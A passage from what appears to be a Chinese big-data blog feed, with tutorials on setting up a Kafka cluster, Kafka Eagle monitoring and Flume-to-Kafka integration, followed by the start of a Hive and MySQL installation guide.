注：broker.id不得重复</p><p>8）启动集群</p><p>​    先启动Zookeeper集群，然后启动kafaka</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102  kafka<span class="token punctuation">]</span>$ zk.sh start <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>依次在hadoop102、hadoop103、hadoop104节点上启动kafka</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon config/server.properties<span class="token punctuation">[</span>molly@hadoop103 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon  config/server.properties<span class="token punctuation">[</span>molly@hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-server-start.sh -daemon  config/server.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>9）关闭集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span class="token punctuation">[</span>molly@hadoop103 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span class="token punctuation">[</span>molly@hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-server-stop.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>10）kafka群起脚本</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashif [ $# -lt 1 ]then   echo "Input Args Error....."  exitfifor i in hadoop102 hadoop103 hadoop104docase $1 instart)  echo "==================START $i KAFKA==================="  ssh $i /opt/module/kafka_2.11-2.4.1/bin/kafka-server-start.sh -daemon /opt/module/kafka_2.11-2.4.1/config/server.properties;;stop)  echo "==================STOP $i KAFKA==================="  ssh $i /opt/module/kafka_2.11-2.4.1/bin/kafka-server-stop.sh stop;;*) echo "Input Args Error....." exit;;  esacdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Kafka命令行操作"><a href="#3-Kafka命令行操作" class="headerlink" title="3 Kafka命令行操作"></a>3 Kafka命令行操作</h1><p>kafka提供了测试脚本kafka-topics.sh用来测试。</p><p>1）查看当前服务器中的所有topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）创建topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --create --replication-factor 3 --partitions 1 --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选项说明：</p><p>–topic 定义topic名<br>–replication-factor 定义副本数<br>–partitions 定义分区数</p><p>3）删除topic</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --delete --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）发送消息：生产消息– <strong>9092是kafka默认端口</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-producer.sh --broker-list hadoop102:9092 --topic first<span class="token operator">></span>hello world<span class="token operator">></span>molly molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>5）消费消息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --topic first<span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>–from-beginning：会把主题中现有的所有的数据都读取出来</strong>。</p><p>6）查看某个Topic的详情</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --describe –-topic first<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）修改分区数 alter只能修改</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-topics.sh --zookeeper hadoop102:2181 --alter –-topic first --partitions 6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-Kafka监控"><a href="#4-Kafka监控" class="headerlink" title="4 Kafka监控"></a>4 Kafka监控</h1><p>我们知道一个叫kafka manager的kafka管理工具，这个工具管理kafka确实很强大，但是没有安全认证，随便都可以创建，删除，修改topic，而且告警系统，流量波动做的不好。所以，在这里浪尖，再给大家推荐一款kafka 的告警监控管理工具，kafka-eagle。Kafka Eagle是一款开源的Kafka集群监控系统。能够实现broker级常见的JMX监控；能对consumer消费进度进行监控；能在页面上直接对多个集群进行管理；安装方式简单，二进制包解压即用；可以配置告警（钉钉、微信、email均可）。</p><p>kafka-eagle主要是有几个我们关注 但kafkamanager不存在的点，值得一提：</p><ul><li>流量，最长可以查看最近七天的流量波动图</li><li>lag size邮件告警</li><li>可以用kafkasql分析</li></ul><p>相关官方地址：</p><ul><li>源码： <a href="https://links.jianshu.com/go?to=https://github.com/smartloli/kafka-eagle/">https://github.com/smartloli/kafka-eagle/</a> </li><li>官网：<a href="https://links.jianshu.com/go?to=https://www.kafka-eagle.org/">https://www.kafka-eagle.org/</a> </li><li>下载： <a href="https://links.jianshu.com/go?to=http://download.kafka-eagle.org/">http://download.kafka-eagle.org/</a> </li><li>安装文档： <a href="https://links.jianshu.com/go?to=https://docs.kafka-eagle.org/2.env-and-install">https://docs.kafka-eagle.org/2.env-and-install</a></li></ul><p><strong>1）修改kafka启动命令</strong></p><p>修改kafka-server-start.sh命令中</p><pre class="line-numbers language-sh"><code class="language-sh">if [ "x$KAFKA_HEAP_OPTS" = "x" ]; then    export KAFKA_HEAP_OPTS="-Xmx1G -Xms1G"fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为</p><pre class="line-numbers language-sh"><code class="language-sh">if [ "x$KAFKA_HEAP_OPTS" = "x" ]; then    export KAFKA_HEAP_OPTS="-server -Xms2G -Xmx2G -XX:PermSize=128m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:ParallelGCThreads=8 -XX:ConcGCThreads=5 -XX:InitiatingHeapOccupancyPercent=70"    export JMX_PORT="9999"    #export KAFKA_HEAP_OPTS="-Xmx1G -Xms1G"fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：修改之后在启动Kafka之前要分发之其他节点</p><p> <strong>2）上传压缩包kafka-eagle-bin-1.4.5.tar.gz到集群/opt/software目录</strong></p><p><strong>3）解压到本地</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka-eagle-bin-1.4.5.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>4）进入刚才解压的目录</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka-eagle-bin-1.4.5<span class="token punctuation">]</span>$ ll总用量 82932-rw-rw-r--. 1 molly molly 84920710 8月 13 23:00 kafka-eagle-web-1.4.5-bin.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>5）将kafka-eagle-web-1.3.7-bin.tar.gz解压至/opt/module</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka-eagle-bin-1.4.5<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf kafka-eagle-web-1.4.5-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>6）修改名称</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> kafka-eagle-web-1.4.5/ eagle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <strong>7）给启动文件执行权限</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 eagle<span class="token punctuation">]</span>$ <span class="token function">cd</span> bin/<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ ll总用量 12-rw-r--r--. 1 molly molly 1848 8月 22 2017 ke.bat-rw-r--r--. 1 molly molly 7190 7月 30 20:12 ke.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> 777 ke.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>8）修改配置文件 conf/system-config.properties</strong></p><pre class="line-numbers language-sh"><code class="language-sh">####################################### multi zookeeper&kafka cluster list######################################kafka.eagle.zk.cluster.alias=cluster1cluster1.zk.list=hadoop102:2181,hadoop103:2181,hadoop104:2181####################################### kafka offset storage######################################cluster1.kafka.eagle.offset.storage=kafka####################################### enable kafka metrics######################################kafka.eagle.metrics.charts=truekafka.eagle.sql.fix.error=false####################################### kafka jdbc driver address######################################kafka.eagle.driver=com.mysql.jdbc.Driverkafka.eagle.url=jdbc:mysql://hadoop102:3306/ke?useUnicode=true&characterEncoding=UTF-8&zeroDateTimeBehavior=convertToNullkafka.eagle.username=rootkafka.eagle.password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>9）添加环境变量</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> KE_HOME<span class="token operator">=</span>/opt/module/eagle<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$KE_HOME</span>/bin<span class="token comment" spellcheck="true">#注意：source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>10）启动</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>atguigu@hadoop102 eagle<span class="token punctuation">]</span>$ bin/ke.sh start<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.******************************************************************** Kafka Eagle Service has started success.* Welcome, Now you can visit <span class="token string">'http://192.168.202.102:8048/ke'</span>* Account:admin ,Password:123456******************************************************************** <span class="token operator">&lt;</span>Usage<span class="token operator">></span> ke.sh <span class="token punctuation">[</span>start<span class="token operator">|</span>status<span class="token operator">|</span>stop<span class="token operator">|</span>restart<span class="token operator">|</span>stats<span class="token punctuation">]</span> <span class="token operator">&lt;</span>/Usage<span class="token operator">></span>* <span class="token operator">&lt;</span>Usage<span class="token operator">></span> https://www.kafka-eagle.org/ <span class="token operator">&lt;</span>/Usage<span class="token operator">></span>*******************************************************************<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：启动之前需要先启动ZK以及KAFKA</strong></p><p> <strong>11）登录页面查看监控数据</strong></p><p><a href="http://192.168.202.102:8048/ke">http://192.168.202.102:8048/ke</a></p><p> <img src="/2020/11/15/bigdata-kafka1-setup/1637153214475.png" alt="1637153214475"></p><p>​                         </p><h1 id="5-Flume对接Kafka"><a href="#5-Flume对接Kafka" class="headerlink" title="5 Flume对接Kafka"></a>5 Flume对接Kafka</h1><h2 id="5-1-简单实现"><a href="#5-1-简单实现" class="headerlink" title="5.1 简单实现"></a>5.1 简单实现</h2><p><strong>1）配置flume</strong></p><pre class="line-numbers language-sh"><code class="language-sh"># definea1.sources = r1a1.sinks = k1a1.channels = c1# sourcea1.sources.r1.type = execa1.sources.r1.command = tail -F  /opt/module/data/flume.log# sinka1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sinks.k1.kafka.topic = firsta1.sinks.k1.kafka.flumeBatchSize = 20a1.sinks.k1.kafka.producer.acks = 1a1.sinks.k1.kafka.producer.linger.ms = 1# channela1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# binda1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2） 启动kafka消费者</p><p>3） 进入flume根目录下，启动flume</p><pre class="line-numbers language-bash"><code class="language-bash">$ bin/flume-ng agent -c conf/ -n a1 -f jobs/flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4） 向 /opt/module/data/flume.log里追加数据，查看kafka消费者消费情况</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token keyword">echo</span> hello <span class="token operator">>></span> /opt/module/data/flume.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2-数据分离"><a href="#5-2-数据分离" class="headerlink" title="5.2 数据分离"></a>5.2 数据分离</h2><p>0)需求 </p><p>将flume采集的数据按照不同的类型输入到不同的topic中</p><p>​     将日志数据中带有molly的，输入到Kafka的first主题中，</p><p>​     将日志数据中带有shangguigu的,输入到Kafka的second主题中，</p><p>​        其他的数据输入到Kafka的third主题中</p><p>1） 编写Flume的Interceptor</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>flumeInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>text<span class="token punctuation">.</span>html<span class="token punctuation">.</span>HTMLEditorKit<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlumeKafkaInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 如果包含"atguigu"的数据，发送到first主题     * 如果包含"sgg"的数据，发送到second主题     * 其他的数据发送到third主题     * @param event     * @return     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.获取event的header</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.获取event的body</span>        String body <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"topic"</span><span class="token punctuation">,</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"sgg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"topic"</span><span class="token punctuation">,</span><span class="token string">"second"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MyBuilder</span> <span class="token keyword">implements</span>  <span class="token class-name">Builder</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span>  <span class="token keyword">new</span> <span class="token class-name">FlumeKafkaInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）将写好的interceptor打包上传到Flume安装目录的lib目录下</p><p>3）配置flume</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = 0.0.0.0a1.sources.r1.port = 6666# Describe the sinka1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.topic = thirda1.sinks.k1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sinks.k1.kafka.flumeBatchSize = 20a1.sinks.k1.kafka.producer.acks = 1a1.sinks.k1.kafka.producer.linger.ms = 1#Interceptora1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.atguigu.kafka.flumeInterceptor.FlumeKafkaInterceptor$MyBuilder# # Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4） 启动kafka消费者</p><p>5） 进入flume根目录下，启动flume</p><pre class="line-numbers language-bash"><code class="language-bash">$ bin/flume-ng agent -c conf/ -n a1 -f jobs/flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6） 向6666端口写数据，查看kafka消费者消费情况</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（一） Hive安装</title>
      <link>https://m01ly.github.io/2020/11/14/bigdata-hive1/</link>
      <guid>https://m01ly.github.io/2020/11/14/bigdata-hive1/</guid>
      <pubDate>Sat, 14 Nov 2020 07:08:50 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前面学习到利用mapreduce去计算，但是mapreduce写起来麻烦，并且代码重复度高，可以进行封装，所以就出来了Hive，hive工具通过执行类SQL来启动写好的mapreduce,进一步执行hdfs中的资源。</p><h1 id="1-Hive是什么"><a href="#1-Hive是什么" class="headerlink" title="1 Hive是什么"></a>1 Hive是什么</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>1） hive简介</p><p>Hive：由Facebook开源用于解决海量结构化日志的数据统计工具。</p><p>Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张表，并提供类SQL查询功能。</p><p>2） Hive本质：将HQL转化成MapReduce程序如下图所示。需要注意的是以下三点：</p><p>（1）Hive处理的数据存储在HDFS</p><p>（2）Hive分析数据底层的实现是MapReduce</p><p>（3）执行程序运行在Yarn上</p><p><img src="/2020/11/14/bigdata-hive1/1636945549117.png" alt="1636945549117"></p><h2 id="1-2-Hive架构"><a href="#1-2-Hive架构" class="headerlink" title="1.2 Hive架构"></a>1.2 Hive架构</h2><p>Hive通过给用户提供的一系列交互接口，接收到用户的指令(SQL)，使用自己的Driver，结合元数据(MetaStore)，将这些指令翻译成MapReduce，提交到Hadoop中执行，最后，将执行返回的结果输出到用户交互接口。具体架构图如下所示。</p><p><img src="/2020/11/14/bigdata-hive1/1636945658710.png" alt="1636945658710"></p><p>1）用户接口：Client</p><p>CLI（command-line interface）、JDBC/ODBC(jdbc访问hive)、WEBUI（浏览器访问hive）</p><p>2）元数据：Metastore</p><p>元数据包括：表名、表所属的数据库（默认是default）、表的拥有者、列/分区字段、表的类型（是否是外部表）、表的数据所在目录等；</p><p><strong>默认存储在自带的derby数据库中，推荐使用MySQL存储Metastore</strong></p><p>3）Hadoop</p><p><strong>使用HDFS进行存储，使用MapReduce进行计算。</strong></p><p>4）驱动器：Driver</p><p>（1）解析器（SQL Parser）：将SQL字符串转换成抽象语法树AST，这一步一般都用第三方工具库完成，比如antlr；对AST进行语法分析，比如表是否存在、字段是否存在、SQL语义是否有误。</p><p>（2）编译器（Physical Plan）：将AST编译生成逻辑执行计划。</p><p>（3）优化器（Query Optimizer）：对逻辑执行计划进行优化。</p><p>（4）执行器（Execution）：把逻辑执行计划转换成可以运行的物理计划。对于Hive来说，就是MR/Spark。</p><h1 id="2-Hive-安装"><a href="#2-Hive-安装" class="headerlink" title="2 Hive 安装"></a>2 Hive 安装</h1><h2 id="2-1-Hive安装地址"><a href="#2-1-Hive安装地址" class="headerlink" title="2.1 Hive安装地址"></a>2.1 Hive安装地址</h2><p>1）Hive官网地址</p><p><a href="http://hive.apache.org/">http://hive.apache.org/</a></p><p>2）文档查看地址</p><p><a href="https://cwiki.apache.org/confluence/display/Hive/GettingStarted">https://cwiki.apache.org/confluence/display/Hive/GettingStarted</a></p><p>3）下载地址</p><p><a href="http://archive.apache.org/dist/hive/">http://archive.apache.org/dist/hive/</a></p><p>4）github地址</p><p><a href="https://github.com/apache/hive">https://github.com/apache/hive</a></p><h2 id="2-2-MySql安装"><a href="#2-2-MySql安装" class="headerlink" title="2.2 MySql安装"></a>2.2 MySql安装</h2><p>0）为什么需要Mysql</p><p>原因在于Hive默认使用的元数据库为derby，开启Hive之后就会占用元数据库，且不与其他客户端共享数据，如果想多窗口操作就会报错，操作比较局限。以我们需要将Hive的元数据地址改为MySQL，可支持多窗口操作。</p><p>1）检查当前系统是否安装过Mysql</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ rpm -qa<span class="token operator">|</span><span class="token function">grep</span> -I -E mysql\<span class="token operator">|</span>mariadbmariadb-libs-5.5.56-2.el7.x86_64 //如果存在通过如下命令卸载<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -e --nodeps mariadb-libs  //用此命令卸载mariadb<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ rpm -qa<span class="token operator">|</span><span class="token function">grep</span> -I -E mysql\<span class="token operator">|</span>mariadb <span class="token operator">|</span> <span class="token function">xargs</span> -n1 <span class="token function">sudo</span> rpm -e --nodeps<span class="token comment" spellcheck="true">#卸载所有</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）将MySQL安装包拷贝到/opt/software目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ll</span>总用量 528384-rw-r--r--. 1 root root 609556480 3月 21 15:41 mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）解压MySQL安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tar -xf mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）在安装目录下执行rpm安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-common-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-libs-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh 